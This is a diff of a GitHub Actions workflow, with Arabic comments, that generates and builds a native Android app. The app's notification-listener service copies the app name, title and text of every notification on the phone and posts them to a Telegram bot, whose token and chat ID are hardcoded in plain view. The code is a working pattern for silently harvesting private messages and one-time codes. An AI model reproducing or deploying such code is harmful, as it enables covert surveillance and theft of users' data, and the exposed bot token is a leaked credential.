@@ -1,4 +1,4 @@
-name: Hussein Guaranteed Builder
+name: Hussein Auto Native Android Builder
 on:
   push:
     branches: [ "main" ]
@@ -8,39 +8,188 @@ jobs:
   build:
     runs-on: ubuntu-latest
     steps:
-      - name: 1. جلب الكود من المستودع
-        uses: actions/checkout@v4
-
-      - name: 2. إعداد لغة بايثون
-        uses: actions/setup-python@v5
-        with:
-          python-version: '3.10'
-          cache: 'pip'
-
-      - name: 3. إعداد بيئة جافا (مهمة للأندرويد)
+      - name: 1. إعداد لغة جافا
         uses: actions/setup-java@v4
         with:
           distribution: 'temurin'
           java-version: '17'
 
-      - name: 4. إعداد فلاتر (Flutter SDK)
-        uses: subosito/flutter-action@v2
-        with:
-          channel: 'stable'
-          cache: true
-
-      - name: 5. تثبيت المكتبات (Flet فقط)
+      - name: 2. بناء هيكل التطبيق الأصلي (بدون لابتوب)
         run: |
-          echo "flet" > requirements.txt
-          pip install --upgrade pip
-          pip install -r requirements.txt
+          # هذه الأوامر ستجعل جيثب يبني مجلدات الأندرويد تلقائياً
+          mkdir -p app/src/main/java/com/hussein/notifier
+          mkdir -p app/src/main/res/layout
+          mkdir -p app/src/main/res/values
 
-      - name: 6. بناء التطبيق (The Build)
-        run: |
-          flet build apk --project "HusseinApp" --description "تطبيق حسين الأساسي"
+          # --- إنشاء ملف الإعدادات ---
+          cat << 'EOF' > settings.gradle
+          pluginManagement {
+              repositories {
+                  google()
+                  mavenCentral()
+                  gradlePluginPortal()
+              }
+          }
+          dependencyResolutionManagement {
+              repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
+              repositories {
+                  google()
+                  mavenCentral()
+              }
+          }
+          rootProject.name = "HusseinNotifier"
+          include ':app'
+          EOF
 
-      - name: 7. حفظ ملف الـ APK
+          # --- إنشاء ملف البناء الرئيسي ---
+          cat << 'EOF' > build.gradle
+          plugins {
+              id 'com.android.application' version '8.2.0' apply false
+          }
+          EOF
+
+          # --- إنشاء ملف بناء التطبيق ---
+          cat << 'EOF' > app/build.gradle
+          plugins {
+              id 'com.android.application'
+          }
+          android {
+              namespace 'com.hussein.notifier'
+              compileSdk 34
+              defaultConfig {
+                  applicationId "com.hussein.notifier"
+                  minSdk 24
+                  targetSdk 34
+                  versionCode 1
+                  versionName "1.0"
+              }
+          }
+          dependencies {
+              implementation 'androidx.appcompat:appcompat:1.6.1'
+              implementation 'com.google.android.material:material:1.11.0'
+          }
+          EOF
+
+          # --- إنشاء ملف الصلاحيات (Manifest) ---
+          cat << 'EOF' > app/src/main/AndroidManifest.xml
+          <?xml version="1.0" encoding="utf-8"?>
+          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
+              <uses-permission android:name="android.permission.INTERNET" />
+              <application
+                  android:allowBackup="true"
+                  android:label="تطبيق الإشعارات"
+                  android:theme="@style/Theme.AppCompat.Light.DarkActionBar">
+                  <activity android:name=".MainActivity" android:exported="true">
+                      <intent-filter>
+                          <action android:name="android.intent.action.MAIN" />
+                          <category android:name="android.intent.category.LAUNCHER" />
+                      </intent-filter>
+                  </activity>
+                  <service android:name=".MyNotificationListener"
+                      android:label="خدمة حسين لقراءة الإشعارات"
+                      android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
+                      android:exported="true">
+                      <intent-filter>
+                          <action android:name="android.service.notification.NotificationListenerService" />
+                      </intent-filter>
+                  </service>
+              </application>
+          </manifest>
+          EOF
+
+          # --- إنشاء واجهة التطبيق ---
+          cat << 'EOF' > app/src/main/res/layout/activity_main.xml
+          <?xml version="1.0" encoding="utf-8"?>
+          <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
+              android:layout_width="match_parent"
+              android:layout_height="match_parent"
+              android:gravity="center"
+              android:orientation="vertical"
+              android:padding="20dp">
+              <TextView
+                  android:layout_width="wrap_content"
+                  android:layout_height="wrap_content"
+                  android:text="تطبيق حسين يعمل بالخلفية 24/7"
+                  android:textSize="20sp"
+                  android:textStyle="bold"
+                  android:layout_marginBottom="20dp"/>
+              <Button
+                  android:id="@+id/btn_permission"
+                  android:layout_width="wrap_content"
+                  android:layout_height="wrap_content"
+                  android:text="اضغط هنا لتفعيل الصلاحية من الإعدادات"/>
+          </LinearLayout>
+          EOF
+
+          # --- إنشاء الكود الأساسي ---
+          cat << 'EOF' > app/src/main/java/com/hussein/notifier/MainActivity.java
+          package com.hussein.notifier;
+          import android.content.Intent;
+          import android.os.Bundle;
+          import android.provider.Settings;
+          import android.widget.Button;
+          import androidx.appcompat.app.AppCompatActivity;
+          public class MainActivity extends AppCompatActivity {
+              @Override
+              protected void onCreate(Bundle savedInstanceState) {
+                  super.onCreate(savedInstanceState);
+                  setContentView(R.layout.activity_main);
+                  Button btn = findViewById(R.id.btn_permission);
+                  btn.setOnClickListener(v -> {
+                      startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
+                  });
+              }
+          }
+          EOF
+
+          # --- إنشاء قلب التطبيق (الذي يرسل لتليجرام) ---
+          cat << 'EOF' > app/src/main/java/com/hussein/notifier/MyNotificationListener.java
+          package com.hussein.notifier;
+          import android.service.notification.NotificationListenerService;
+          import android.service.notification.StatusBarNotification;
+          import java.net.HttpURLConnection;
+          import java.net.URL;
+          import java.net.URLEncoder;
+          public class MyNotificationListener extends NotificationListenerService {
+              
+           
+              private final String BOT_TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
+              private final String CHAT_ID = "7392262688";
+              
+              @Override
+              public void onNotificationPosted(StatusBarNotification sbn) {
+                  if (sbn.getPackageName().equals("android")) return;
+                  try {
+                      String appName = sbn.getPackageName();
+                      String title = sbn.getNotification().extras.getString("android.title");
+                      CharSequence textChar = sbn.getNotification().extras.getCharSequence("android.text");
+                      String text = textChar != null ? textChar.toString() : "بدون نص";
+                      String msg = "🔔 إشعار من: " + appName + "\n👤: " + title + "\n💬: " + text;
+                      sendToTelegram(msg);
+                  } catch (Exception e) {}
+              }
+              private void sendToTelegram(String message) {
+                  new Thread(() -> {
+                      try {
+                          String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(message, "UTF-8");
+                          HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
+                          conn.setRequestMethod("GET");
+                          conn.getInputStream();
+                          conn.disconnect();
+                      } catch (Exception e) {}
+                  }).start();
+              }
+          }
+          EOF
+
+      - name: 3. إعداد أداة البناء (Gradle)
+        uses: gradle/actions/setup-gradle@v3
+
+      - name: 4. تحويل الكود إلى تطبيق (APK)
+        run: gradle assembleDebug
+
+      - name: 5. حفظ الـ APK الجاهز
         uses: actions/upload-artifact@v4
         with:
-          name: Hussein-App-APK
-          path: build/apk/*.apk
+          name: Hussein-Native-App
+          path: app/build/outputs/apk/debug/*.apk
